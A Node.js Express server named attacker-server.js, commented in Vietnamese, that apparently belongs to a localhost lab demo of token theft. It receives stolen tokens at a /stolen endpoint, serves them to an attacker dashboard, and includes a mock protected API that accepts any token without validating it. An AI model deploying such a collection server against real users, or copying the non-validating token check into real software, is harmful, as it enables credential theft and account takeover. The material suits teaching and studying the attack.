// File: attacker-server.js
const express = require('express');
const cors = require('cors');
const app = express();
const port = 5502;

let latestStolenTokenData = null; 

// --- BẮT ĐẦU SỬA LỖI CORS ---

// Cấu hình CORS chi tiết
const corsOptions = {
    // Cho phép request từ 2 trang của bạn
    origin: [
        'http://127.0.0.1:5501', // Cho phép trang Victim (index.html)
        'http://127.0.0.1:5500'  // Cho phép trang Attacker (attacker.html)
    ],
    methods: ['GET', 'POST', 'OPTIONS'], // Cho phép các phương thức này
    allowedHeaders: ['Content-Type', 'Authorization'] // Cho phép các header này
};

console.log('Đang áp dụng cài đặt CORS chi tiết...');
// Áp dụng middleware CORS cho TẤT CẢ các request
app.use(cors(corsOptions));

// --- KẾT THÚC SỬA LỖI CORS ---

// Cho phép server đọc JSON
app.use(express.json()); 

// Tạo endpoint /stolen để nhận dữ liệu
app.post('/stolen', (req, res) => {
    console.log('🔴 DATA BỊ ĐÁNH CẮP!!! 🔴');
    console.log('Loại:', req.body.type);
    console.log('Nguồn:', req.body.source);
    console.log('Dữ liệu:', JSON.stringify(req.body.data, null, 2));
    console.log('------------------------------');

    if (req.body.type === 'tokens') {
        latestStolenTokenData = req.body.data;
        console.log('[Server] Đã lưu token mới nhất.');
    }

    // Gửi lại 1 response thành công
    res.status(200).send({ message: 'Data received' });
});

// Endpoint để dashboard lấy token
app.get('/get-latest-token', (req, res) => {
    if (latestStolenTokenData) {
        console.log('[Server] Gửi token cho dashboard...');
        res.json(latestStolenTokenData);
    } else {
        console.log('[Server] Dashboard hỏi, nhưng chưa có token.');
        res.status(404).send('Chưa có token nào bị đánh cắp');
    }
});

// API được bảo vệ
app.get('/api/userinfo', (req, res) => {
    console.log('[API] Đã nhận được yêu cầu tới /api/userinfo');
    
    try {
        const authHeader = req.headers['authorization'];
        const token = authHeader && authHeader.split(' ')[1]; 
        
        if (token == null) {
            console.log('[API] ❌ Lỗi: Không có token. Access Denied (401).');
            return res.status(401).send('Không tìm thấy token');
        }

        // --- BẮT ĐẦU SỬA ---
        // Chỉ cần kiểm tra xem token có tồn tại hay không
        // thay vì kiểm tra 'at_'
        if (token) { 
        // --- KẾT THÚC SỬA ---
            console.log('[API] ✅ Thành công: Token hợp lệ. Access Granted (200).');
            res.json({ 
                message: "Access Granted!",
                userData: "Đây là dữ liệu bí mật của user" 
            });
        } else {
            console.log('[API] ❌ Lỗi: Token không hợp lệ. Access Denied (403).');
            res.status(403).send('Token không hợp lệ!');
        }
    } catch (err) {
        console.log('[API] ❌ Lỗi server: ' + err.message);
        res.status(500).send(err.message);
    }
});

app.listen(port, () => {
    console.log(`[Attacker Server] đang chạy tại http://127.0.0.1:${port}`);
    console.log('Đang chờ nhận dữ liệu bị đánh cắp tại endpoint /stolen ...');
});